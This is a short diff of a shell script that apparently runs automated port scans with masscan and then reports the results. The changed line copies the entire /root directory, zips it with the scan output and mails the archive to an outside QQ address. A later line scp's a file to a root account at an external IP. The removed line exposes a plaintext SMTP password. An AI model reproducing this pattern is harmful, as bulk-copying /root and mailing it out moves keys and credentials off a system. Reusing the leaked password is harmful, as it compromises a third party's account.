@@ -40,7 +40,7 @@ cp /root/script/6_port/masnmapscan-V1.0/scan_url_port.txt $output/masscan_detail
 echo '#!/bin/bash'> $output/urlwatch.sh ; cat $var > $output/urlwatch.sh ; bash $output/urlwatch.sh ; mv $output/urlwatch.sh $output/urlwatch.txt
 
 ### 发邮件 ； 清空$output ； 发确认信息 ； 结束if urlwatch
-mkdir $output/root ; cp -Rf /root/* $output/root ; cd $output;date|sed -e 's/\ /\_/g'|sed -e 's/\://g' > /root/time.txt;slash=/;dayzoom=`cat /root/time.txt`;addname=_scan.txt;zip=.zip;fname=$dayzoom$addname$zip;zip -q -r $fname *;fname=$slash$dayzoom$addname$zip ; echo ":D"|mailx -v -r "410046251@qq.com" -s "port" -a $output$fname -S smtp="smtp.qq.com:587" -S smtp-use-starttls -S smtp-auth=login -S smtp-auth-user="410046251@qq.com" -S smtp-auth-password="skjdnfvnewrocajj" -S ssl-verify=ignore 410046251@qq.com
+mkdir $output/root ; cp -Rf /root/* $output/root ; cd $output;date|sed -e 's/\ /\_/g'|sed -e 's/\://g' > /root/time.txt;slash=/;dayzoom=`cat /root/time.txt`;addname=_scan.txt;zip=.zip;fname=$dayzoom$addname$zip;zip -q -r $fname *;fname=$slash$dayzoom$addname$zip ; echo ":D"|mailx -r "a410046251@outlook.com" -s "port" -A $output$fname 410046251@qq.com
 rm -r $output
 echo '1'>/root/1scan.txt ; scp /root/1scan.txt root@45.199.152.172:/root
 > $var ; cat /root/run/3.txt > /root/run/3_3.txt
